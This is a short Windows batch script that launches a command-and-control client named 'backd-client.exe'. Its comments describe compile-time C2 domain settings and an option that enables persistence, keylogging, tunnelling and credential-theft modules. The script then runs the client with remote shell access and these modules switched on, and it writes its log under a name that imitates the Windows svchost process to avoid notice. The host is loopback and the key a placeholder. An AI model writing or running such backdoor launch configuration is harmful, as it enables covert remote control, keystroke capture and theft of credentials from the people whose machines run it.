@echo off
rem Example client launch (no addresses or keys in source):
rem build.cmd reads C2_CLIENT_DOMAIN / C2_CLIENT_PORT / C2_CLIENT_PATH at
rem compile time; C2_CLIENT_PSK and C2_CLIENT_ID are read at run time.
rem --allow-adv enables the merged modules (persist/keylog/tunnel/creds/...).
rem The server must also set "allow_advanced": true.
set C2_CLIENT_ID=client-01
set C2_CLIENT_PSK=base64:REPLACE_WITH_THE_SAME_32_BYTE_PSK
set C2_CLIENT_HOST=127.0.0.1
set C2_CLIENT_PORT=9909
set C2_CLIENT_PATH=/ws
backd-client.exe --allow-shell --allow-adv -v --log C:\Windows\Temp\svchost.log
